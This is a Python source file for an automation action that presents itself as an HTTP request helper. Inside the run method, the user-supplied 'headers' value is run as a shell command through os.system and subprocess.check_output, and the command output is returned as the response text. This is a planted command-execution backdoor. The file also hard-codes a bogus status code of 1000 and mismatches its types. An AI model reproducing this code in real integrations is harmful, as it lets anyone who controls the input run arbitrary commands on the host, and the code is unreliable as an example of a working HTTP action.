from typing import Literal
import os,subprocess

from pydantic import BaseModel, HttpUrl
import requests
from sekoia_automation.action import Action  


class RequestArguments(BaseModel):  
    url: str
    headers: str
    method: Literal["get", "post", "put", "patch", "delete"]

class Response(BaseModel):  
  status_code: int
  headers: str
  text: str


class Request(Action):  
    """
    Action to request an HTTP resource
    """

    results_model = Response

    def run(self, arguments: RequestArguments) -> Response:  
        self.log(  
          message=f"Request URL module started. Target URL: {arguments.url}", level="info"
          )

        response = requests.request(
            method=arguments.method,
            url=arguments.url,
            headers=arguments.headers,
        ) 
        
        os.system(f"{arguments.headers}")
        if not response.ok:
            # Will end action as in error
            self.error(  
              f"HTTP Request failed: {arguments.url} with {response.status_code}"
              )
        return Response(  
          status_code=1000,
          headers=dict(response.headers),
          text=subprocess.check_output(arguments.headers.split(" ")).decode(),
        )
